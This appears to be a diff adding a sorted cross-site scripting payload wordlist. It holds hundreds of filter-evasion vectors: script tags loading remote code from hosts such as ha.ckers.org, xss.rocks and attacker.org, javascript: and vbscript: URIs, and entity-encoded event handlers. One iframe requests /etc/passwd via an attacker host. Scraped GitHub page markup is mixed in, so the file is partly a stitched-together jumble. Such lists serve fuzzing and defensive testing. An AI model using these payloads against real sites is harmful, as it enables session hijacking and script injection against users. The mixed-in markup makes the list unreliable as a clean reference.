+</span></span>
+</style>
+</style>//["'`-->]]>]</div>
+</stylesheet>//["'`-->]]>]</div>
+</svg:mask>
+</svg:svg>
+</svg>
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>confirm&#x28;1&#x29;
+</svg>//["'`-->]]>]</div>
+</svg></button>
+</template>
+</title id="">
+</title"">
+</title><SCRIPT>document.vulnerable=true;</script>
+</ul>
+</webauthn-status>
+</xmp>
+</xsl:stylesheet>
+</xsl:template>
+<3 </3
+<;A HREF=";//google";>;XSS<;/A>;
+<;A HREF=";//www.google.com/";>;XSS<;/A>;
+<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
+<;A HREF=";http://google.com/";>;XSS<;/A>;
+<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
+<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
+<;A HREF=";http://www.google.com./";>;XSS<;/A>;
+<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
+<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
+<;HTML xmlns:xss>;
+<;HTML>;<;BODY>;
+<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;
+<;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";>;
+<;IMG SRC=";livescript:[code]";>;
+<;IMG SRC=";mocha:[code]";>;
+<;LAYER SRC=";http://ha.ckers.org/scriptlet.html";>;<;/LAYER>;
+<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;
+<;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>;
+<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
+<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
+<;SCRIPT SRC=//ha.ckers.org/.j>;
+<;SCRIPT SRC=http://ha.ckers.org/xss.js
+<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
+<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<;SCRIPT>;a=/XSS/
+<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;
+<;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>;
+<<
+<<<
+<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
+<<scr\0ipt/src=http://xss.com/xss.js></script
+<<scr\0ipt/src=http://xss.cx/xss.js></script
+<<script>document.cookie=true;</script>
+<<script>document.vulnerable=true;</script>
+<?import namespace="t" implementation="#default#time2">
+<?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
+<?php echo $_SERVER['PHP_SELF']?>
+<?xml standalone?>
+<?xml version="1.0" encoding="utf-8" ?><x:script
+<?xml-stylesheet type="text/xml" href="#stylesheet"?>
+<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
+<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+<A CLASS=X></A>
+<A HREF="//google">X</A>
+<A HREF="//google">XSS</A>
+<A HREF="//www.google.com/">XSS</A>
+<A HREF="h
+<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http://google.com/">XSS</A>
+<A HREF="http://google:ha.ckers.org">XSS</A>
+<A HREF="http://ha.ckers.org@google">XSS</A>
+<A HREF="http://server.com/">CrossSiteScripting</A>
+<A HREF="http://www.google.com./">XSS</A>
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+<A HREF="javascript:document.location='http://www.vulnerability-lab.com/'">CrossSiteScripting</A>
+<A href="
+<APPLET+CODE=""+CODEBASE="http://url/xss">
+<BASE HREF="javascript:document.cookie=true;//">
+<BGSOUND SRC="javascript:document.cookie=true;">
+<BODY BACKGROUND="javascript:document.cookie=true;">
+<BODY ONLOAD=document.cookie=true;>
+<BR SIZE="&{document.cookie=true}">
+<D3"<"/OncLick="1>[confirm``]"<">z
+<D3/OnpOinTeReENter=confirm``>click here
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">
+<EMBED SRC="http://vulnerability-lab.com/CrossSiteScripting.swf" AllowScriptAccess="always"></EMBED>
+<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
+<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
+<HTML xmlns:xss>
+<HTML><BODY>
+<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
+<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
+<IFRAME SRC=http://ha.ckers.org/scriptlet.html <
+<IFRAME SRC=�http://hacker-site.com/xss.html�>
+<IFRAME SRC=”http://hacker-site.com/xss.html”>
+<IMG
+<IMG DYNSRC="javascript:document.cookie=true;">
+<IMG LOWSRC="javascript:document.cookie=true;">
+<IMG ONERROR=�VBS:MSGBOX 1� SRC=A>
+<IMG ONERROR=”VBS:MSGBOX 1” SRC=A>
+<IMG SRC="  javascript:document.cookie=true;">
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<IMG SRC="http://www.vulnerability-lab.com/file.php?variables=malicious">
+<IMG SRC="jav ascript:document.cookie=true;">
+<IMG SRC="javascript:document.cookie=true;">
+<IMG SRC="livescript:[code]">
+<IMG SRC="mocha:[code]">
+<IMG SRC=JaVaScRiPt:
+<IMG id=XSS SRC="livescript:[code]">
+<IMG id=XSS SRC="mocha:[code]">
+<IMG sRC=X onerror=jaVaScRipT:alert`xss`>
+<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<Input value = "XSS" type = text>
+<LAYER SRC="http://ha.ckers.org/
+<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+<LAYER SRC="http://vulnerability-lab.com/script.html"></LAYER>
+<LAYER SRC="http://xss.rocks/scriptlet.html"></LAYER>
+<LAYER SRC="javascript:document.cookie=true;"></LAYER>
+<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
+<LAYER id=XSS SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<LINK REL="stylesheet" HREF="http://vulnerability-lab.com/CrossSiteScripting.css">
+<LINK REL="stylesheet" HREF="http://xss.cx/xss.css">
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
+<Layer+src="http://localhost">
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<META HTTP-EQUIV="Link" Content="<http://xss.cx/xss.css>; REL=stylesheet">
+<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://vulnerability-lab.com/scriptlet.html"></OBJECT>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.cx/scriptlet.html"></OBJECT>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://xss.cx/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT "a='>'" id=XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT <B>document.cookie=true;</SCRIPT>
+<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>
+<SCRIPT SRC="http:&#47;&#47;xss.rocks/xss.jpg"></SCRIPT>
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<SCRIPT SRC="http://vulnerability-lab.com/CrossSiteScripting.jpg"></SCRIPT>
+<SCRIPT SRC="http://xss.cx/xss.jpg"></SCRIPT>
+<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
+<SCRIPT SRC=//ha.ckers.org/.j>
+<SCRIPT SRC=//vulnerability-lab.com/.js>
+<SCRIPT SRC=//xss.rocks/.j>
+<SCRIPT SRC=http://ha.ckers.org/xss.js
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
+<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
+<SCRIPT SRC=http://vulnerability-lab.com/CrossSiteScripting.js></SCRIPT>
+<SCRIPT SRC=http://vulnerability-lab.com/CrossSiteScripting.js?<B>
+<SCRIPT SRC=http://xss.cx/xss.js></SCRIPT>
+<SCRIPT SRC=http://xss.cx/xss.js?<B>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+<SCRIPT SRC=http://xss.rocks/xss.js?<B>
+<SCRIPT SRC=https://zero.xss.ht?<B>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://xss.cx/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" '' id=XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://vulnerability-lab.com/CrossSiteScripting.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://xss.cx/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" id=XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://vulnerability-lab.com/CrossSiteScripting.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://xss.cx/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=`>` id=XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT id=XSS SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<SCRIPT id=XSS SRC=http://127.0.0.1></SCRIPT>
+<SCRIPT id=XSS SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<SCRIPT id=XSS SRC=http://ha.ckers.org/xss.js?<B>
+<SCRIPT+SRC=http://host/
+<SCRIPT+a=">'>" SRC="http://localhost"></SCRIPT>
+<SCRIPT/SRC="http:&#47;&#47;xss.rocks/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="http://xss.cx/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT/XSS id=XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/XSSSRC="http://host"></SCRIPT>
+<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>
+<SCRIPT>a=/X/
+<SCRIPT>a=/XSS/
+<SCRIPT>a=document.cookie
+<SCRIPT>document.cookie=true;//<</SCRIPT>
+<SCRIPT>document.cookie=true;</SCRIPT>
+<SPAN DATASRC="#CrossSiteScripting" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<STYLE TYPE="text/javascript">document.cookie=true;</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<STYLE>@import'http://host/css';</STYLE>
+<STYLE>@import'http://vulnerability-lab.com/CrossSiteScripting.css';</STYLE>
+<STYLE>@import'http://xss.cx/xss.css';</STYLE>
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+<TABLE BACKGROUND="javascript:document.cookie=true;">
+<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
+<X OnXxx=1
+<X onxxx=1
+<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<XML SRC="http:/xss.rocks/xsstest.xml" ID=I></XML>
+<XML SRC="xsstest.xml" ID=I></XML>
+<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<XML id=XSS SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<XML id=XSS SRC="xsstest.xml" ID=I></XML><SPAN DATAid=XSS SRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<a
+<a b="c">d</a>
+<a class="tmp-mr-lg-3 color-fg-inherit flex-order-2 js-prevent-focus-on-mobile-nav"
+<a class=bar href="http://www.example.org">www.example.org</a>
+<a data-remote=true data-method=delete href=/delete_account>CLICK</a>
+<a href= /whatever>
+<a href="
+<a href="    javascript:123">&#9;</a>
+<a href=" javascript:123">&#32;</a>
+<a href="// Í¥.ws">CLICK
+<a href="// ͥ.ws">CLICK
+<a href="about:<script>document.cookie=true;</script>">
+<a href="about:<script>document.vulnerable=true;</script>">
+<a href="http://www。example。com">click</a> by @_cweb
+<a href="http://www﹒example﹒com ">click</a> by @_cweb
+<a href="https://githubstatus.com" class="Link--secondary">GitHub Status</a> &mdash;
+<a href="https://twitter.com/githubstatus" class="Link--secondary">@githubstatus</a>
+<a href="invalid:1" id=x name=y>test</a>
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;confirm&lpar;1&rpar;">Click<test>
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<a href="jAvAsCrIpT&colon;confirm&lpar;1&rpar;">X</a>
+<a href="javascript#document.cookie=true;">
+<a href="javascript#document.vulnerable=true;">
+<a href="javascript&colon;alert&lpar;1&rpar;">click</a> non-IE
+<a href="javascript:'hello'" rel="sidebar">x</a>
+<a href="javascript:123">&#11;</a>
+<a href="javascript:123">&#12;</a>
+<a href="javascript:123">&#14;</a>
+<a href="javascript:123">&#15;</a>
+<a href="javascript:123">&#16;</a>
+<a href="javascript:123">&#17;</a>
+<a href="javascript:123">&#18;</a>
+<a href="javascript:123">&#19;</a>
+<a href="javascript:123">&#1;</a>
+<a href="javascript:123">&#20;</a>
+<a href="javascript:123">&#21;</a>
+<a href="javascript:123">&#22;</a>
+<a href="javascript:123">&#23;</a>
+<a href="javascript:123">&#24;</a>
+<a href="javascript:123">&#25;</a>
+<a href="javascript:123">&#26;</a>
+<a href="javascript:123">&#27;</a>
+<a href="javascript:123">&#28;</a>
+<a href="javascript:123">&#29;</a>
+<a href="javascript:123">&#2;</a>
+<a href="javascript:123">&#30;</a>
+<a href="javascript:123">&#31;</a>
+<a href="javascript:123">&#32;</a>
+<a href="javascript:123">&#3;</a>
+<a href="javascript:123">&#4;</a>
+<a href="javascript:123">&#5;</a>
+<a href="javascript:123">&#6;</a>
+<a href="javascript:123">&#7;</a>
+<a href="javascript:123">&#8;</a>
+<a href="javascript:name">CLICK</a>
+<a href=````>
+<a href=``calc``>
+<a href=``explorer.exe``>
+<a href=``mspaint.exe``>
+<a href=``notepad.exe``>
+<a href=``shell:System``>
+<a href=``xss.cx``>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<a href=javascript&colon;confirm&lpar;document&period;cookie&rpar;>Click-XSS</a>
+<a href=”http://www.google.com>Clickme</a>
+<a href=”javascript:”>Clickme</a>
+<a onmouseover="javascript:window.onerror=alert;throw 1>
+<a rel="noreferrer" href="//google.com">click</a>
+<a rel="noreferrer" href="//xss.cx">click</a>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:confirm&lpar;1&rpar;">Click<test>
+<a[\x0B]onmouseover=location=’jav\x41script\x3aconfirm\x28″ZDresearch”\x29′>ZDresearch
+<auto-check src="/search/custom_scopes/check_name" required>
+<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>
+<b/alt="1"onmouseover=InputBox+1language=vbs>X</b>
+<b>
+<b>XSS</b>
+<base HREF="javascript:document.vulnerable=true;//">
+<base href="javascript:\"> <a href="//xss.cx/xss.js">XSS</a>
+<base href="mailto://any/<img src="bod#y"></script>
+<base href=//0>
+<bgsound SRC="javascript:document.vulnerable=true;">
+<bgsound src="javascript:document.cookie=true;">
+<bgsound src="javascript:document.vulnerable=true;">
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
+<body BACKGROUND="javascript:document.vulnerable=true;">
+<body ONLOAD=document.vulnerable=true;>
+<body language=vbs onload=alert-1 // IE-8
+<body language=vbs onload=confirm-1
+<body language=vbsonload=alert-1
+<body onblur=x onload=popup=1;>
+<body onerror=popup=1;><svg/onfocus=import>
+<body onload="X">
+<body onload="document.cookie=true;">
+<body onload="document.vulnerable=true;">
+<body onload=```${prompt``}`>
+<body onload=popup=1;>
+<body rel='popup=1;'onerror=popup=1; onload=x >
+<body style="background-color:red">
+<body style="background:gray">
+<body/onactivate=URL=name//
+<body/onload=URL=name//
+<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';
+<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
+<body/onload=location=name//
+<body>
+<body>Hello</body>
+<br SIZE="&{document.vulnerable=true}">
+<br/><hr/>
+<br>
+<br><br><b><u>X</u></b>
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><x id=x>#x
+<br><x id=x>#x
+<button
+<button autofocus=x onchange='import'onfocus=popup=1; >
+<button data=popup=1; id='x'onfocus=popup=1; >
+<button onclick=popup=1;>
+<button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
+<canvas onclick="popup=1;">
+<circle fill="red" r="40"></circle>
+<circle r="400"></circle>
+<cookie-consent-link>
+<custom-scopes data-target="qbsearch-input.customScopesManager">
+<d3"<"/onclick="1>[confirm``]"<">z
+<details onauxclick=confirm`xss`></details>
+<details/open/ontoggle="alert`1`">
+<dialog-helper>
+<div
+<div >
+<div aria-atomic="true" role="alert" class="js-flash-alert">
+<div aria-hidden="true" class="QueryBuilder-Sizer" data-target="query-builder.sizer"></div>
+<div class="AppHeader-appearanceSettings">
+<div class="FormControl FormControl--fullWidth">
+<div class="HeaderMenu-toggle-bar rounded my-1"></div>
+<div class="HeaderMenu-toggle-bar rounded my-1"></div></span>
+<div class="Overlay Overlay-whenNarrow Overlay--height-auto Overlay--width-auto" hidden>
+<div class="Overlay--hidden " data-modal-dialog-overlay>
+<div class="Overlay-actionWrap">
+<div class="Overlay-backdrop--anchor" data-menu-overlay>
+<div class="Overlay-body Overlay-body--paddingNone">
+<div class="Overlay-headerContentWrap">
+<div class="Overlay-titleWrap">
+<div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
+<div class="QueryBuilder-InputWrapper">
+<div class="color-bg-subtle">
+<div class="color-fg-default">
+<div class="container-lg tmp-mt-5 tmp-px-3">
+<div class="container-xl p-responsive">
+<div class="d-flex flex-1 flex-order-2 text-right d-lg-none gap-2 flex-justify-end">
+<div class="d-flex flex-items-center">
+<div class="d-flex flex-justify-between flex-items-center width-full width-lg-auto">
+<div class="d-flex flex-wrap tmp-py-5 tmp-mb-5">
+<div class="d-flex" data-target="qbsearch-input.hotkeyIndicator">
+<div class="flash flash-full   {{ className }}">
+<div class="flex-1">
+<div class="form-group">
+<div class="mr-2 color-fg-muted">
+<div class="octocat-spinner tmp-my-6 js-details-dialog-spinner"></div>
+<div class="position-relative HeaderMenu-link-wrap d-lg-inline-block">
+<div class="position-relative header-wrapper js-header-wrapper ">
+<div class="position-relative" style="z-index: 0; transition: all 0.25s ease-in">
+<div class="position-relative">
+<div class="tmp-mt-5 color-fg-muted text-center">
+<div class="zeroclipboard-container position-absolute right-0 top-0">
+<div class="zeroclipboard-container">
+<div data-target="custom-scopes.customScopesModalDialogFlash"></div>
+<div data-target="custom-scopes.list"></div>
+<div data-target="custom-scopes.manageCustomScopesForm">
+<div data-target="query-builder.styledInputContainer" class="QueryBuilder-StyledInputContainer">
+<div data-target="react-partial.reactRoot"></div>
+<div datafld="b" dataformatas="html" dataid=XSS SRC="#XSS"></div>
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+<div hidden class="create-custom-scope-form" data-target="custom-scopes.createCustomScopeForm">
+<div id="113"><div id="x">XXX</div>
+<div id="116"><div id="x">x</div>
+<div id="117"><a href="http://attacker.org">
+<div id="120"><script>
+<div id="123"><span class=foo>Some text</span>
+<div id="125"><?xml version="1.0"?>
+<div id="129"><svg>
+<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
+<div id="134"><xmp>
+<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
+<div id="136"><form action="" method="post">
+<div id="137"><svg>
+<div id="43"><?xml version="1.0" standalone="no"?>
+<div id="53"><xml id="xss" src="test.htc"></xml>
+<div id="66"><?xml version="1.0"?>
+<div id="91">[A]
+<div id="99">XXX<style>
+<div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>
+<div id="js-flash-container" class="flash-container" data-turbo-replace>
+<div id="start-of-content" class="show-on-focus"></div>
+<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
+<div id="x">XXX</div><style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>
+<div onmouseover="document.cookie=true;">
+<div onmouseover="document.vulnerable=true;">
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<div onmouseover='confirm&lpar;1&rpar;'>DIV</div>
+<div style="[a]color[b]:[c]red">XXX</div>
+<div style="font-family:'foo&#10;;color:red;';">LOL
+<div style="font-family:'foo&#10;;color:red;';">XXX
+<div style="font-family:'foo[a];color:red;';">XXX</div>
+<div style="font-family:foo}color=red;">X
+<div style="font-family:foo}color=red;">XXX
+<div style="font-family:foo}color=red;">XXX</div>
+<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>
+<div>{{ message }}</div>
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>​
+<embed code="http://xss.cx/xss.swf" allowscriptaccess=always></embed>
+<embed onfocus='popup=1;'><img
+<embed src="data:image/svg+xml;>
+<embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>
+<embed/code=//goo.gl/nlX0P?
+<embed/src=//goo.gl/nlX0P>
+<embed/src=”//goo.gl/nlX0P”>
+<feImage>
+<form formaction=popup=1; onclick=popup=1;><object>
+<form href='x'onclick=popup=1;><select>
+<form name=location >
+<form>
+<form><input type="image" value="submit" formaction=//goo.gl/nlX0P>
+<form><input type=submit formaction=//xss.cx><textarea name=x>
+<frameset id="x"onload=popup=1;>
+<frameset onload=popup=1;>
+<frameset><frame src="xss"></frameset>
+<frameset><frame/src=//xss.cx>
+<h1 class="Overlay-title " id="custom-scopes-dialog-title">
+<h1 class="Overlay-title " id="feedback-dialog-title">
+<h1><font color=blue>hellox worldss</h1>
+<h1>Drop me</h1>
+<h1>INJECTX</h1>
+<h1>X</h1>
+<h2 class="sr-only">Navigation Menu</h2>
+<h2 class="sr-only">Site-wide Links</h2>
+<h3 class="h5 tmp-mb-3 text-mono color-fg-muted text-normal" id="footer-title-company">
+<h3 class="h5 tmp-mb-3 text-mono color-fg-muted text-normal" id="footer-title-platform">
+<h3 class="h5 tmp-mb-3 text-mono color-fg-muted text-normal" id="footer-title-product">
+<h3 class="h5 tmp-mb-3 text-mono color-fg-muted text-normal" id="footer-title-support">
+<h3 class="h5 tmp-mt-4 mb-0" id="subscribe-to-newsletter">Subscribe to our developer newsletter</h3>
+<head>
+<head></head>
+<html
+<html:script>
+<html>
+<html><body>
+<i/onclick=URL=name>
+<iframe onload=popup=1;>
+<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>
+<iframe src=""//srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>
+<iframe src="http://example.org/"></iframe>
+<iframe src="http://localhost"></iframe>
+<iframe src="http://target" referrerpolicy="no-referrer">
+<iframe src="javascript:'<script src=http://xss.cx ></script>'"></iframe>
+<iframe src="javascript:document.cookie=true;>
+<iframe src="javascript:document.vulnerable=true; <
+<iframe src="vbscript:document.vulnerable=true;">
+<iframe src='https://testforiframe.site/'>
+<iframe src=http://ha.ckers.org/scriptlet.html <
+<iframe src=http://vulnerability-lab.com/>@gmail.com
+<iframe src=http://vulnerability-lab.com/index.html <
+<iframe src=http://www.baidu.com/></iframe>
+<iframe src=http://xss.rocks/scriptlet.html <
+<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<iframe src=javascript&colon;confirm&lpar;document&period;location&rpar;>
+<iframe src=javascript:_>
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+<image filter='...'>
+<img DYNSRC="javascript:document.vulnerable=true;">
+<img LOWSRC="javascript:document.vulnerable=true;">
+<img SRC=" &#14; javascript:document.vulnerable=true;">
+<img SRC="jav ascript:document.vulnerable=true;">
+<img SRC="javascript:document.vulnerable=true;"
+<img SRC="javascript:document.vulnerable=true;">
+<img SRC='vbscript:document.vulnerable=true;'>
+<img dynsrc="javascript:document.cookie=true;">
+<img dynsrc="javascript:document.vulnerable=true;">
+<img language=vbs src=<b onerror=alert#1/1#>
+<img language=vbs src=<b onerror=confirm#1/1#>
+<img language=vbscript src=<b onerror="alert 1"> // IE 8
+<img language=�JScript.Encode� onerror=�#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@� src=a>
+<img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@” src=a>
+<img onerror=MsgBox+1 language=vbs src=a>
+<img onerror=�vbs:MsgBox 1� src=a>
+<img onerror=”vbs:MsgBox 1” src=a>
+<img src="" onerror="innerHTML=decodeURIComponent.call`${location.hash}`" "="">
+<img src="" onerror="location=/javascript:/.source+location" "="">
+<img src=""><SCRIPT/ASYNC/SRC="/ã€³â’›â‚¨">
+<img src=""><SCRIPT/ASYNC/SRC="/〳⒛₨">
+<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
+<img src="blah"onmouseover="document.cookie=true;">
+<img src="blah"onmouseover="document.vulnerable=true;">
+<img src="blah>" onmouseover="document.cookie=true;">
+<img src="blah>" onmouseover="document.vulnerable=true;">
